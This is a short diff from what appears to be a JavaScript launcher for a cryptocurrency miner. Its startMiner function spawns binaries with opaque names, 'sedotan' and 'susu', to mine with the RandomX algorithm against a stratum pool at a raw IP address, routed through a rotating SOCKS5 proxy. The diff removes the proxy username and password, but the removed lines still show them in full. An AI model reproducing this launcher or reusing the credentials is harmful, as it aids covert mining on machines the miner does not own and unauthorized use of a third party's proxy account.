@@ -36,8 +36,8 @@ function startMiner() {
 
   miner = spawn("./sedotan", [
     "--socks5=p.webshare.io:80",
-    "--socks5_username=pymiivur-rotate",
-    "--socks5_password=o5tci5ctvvde",
+    "--socks5_username=",
+    "--socks5_password=",
     "./susu",
     "-a", "rx/0",
     "-o", "stratum+tcp://51.178.76.133:3339",
